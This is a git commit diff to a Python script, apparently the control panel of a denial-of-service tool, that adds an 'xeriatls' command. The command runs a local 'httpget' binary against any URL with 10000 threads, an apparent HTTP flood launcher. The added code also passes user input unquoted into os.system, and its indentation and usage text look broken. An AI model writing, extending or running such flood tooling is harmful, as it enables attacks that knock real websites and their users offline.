61c2e7497266c8ddf2570d995cd94991aafbb0d3
levanderdev <86545190+levanderdev@users.noreply.github.com>
2023-11-12 11:47:47 +0700

    Update xeriac2.py

--- xeriac2.py
+++ xeriac2.py
@@ -625,6 +625,15 @@ def main():
                 print('Usage: httpget <url>')
                 print('Example: httpget http://example.com')
 
+         elif "xeriatls" in cnc:
+            try:
+                url = cnc.split()[1]
+                os.system(f'./httpget {url} 10000 50 100')
+            except IndexError:
+                print('Usage: xeriatls <url> <thread> <time> <request_persecond')
+                print('Example: xeriatls http://example.com')
+
+
 # BANNERS
 
         elif "troll" in cnc:
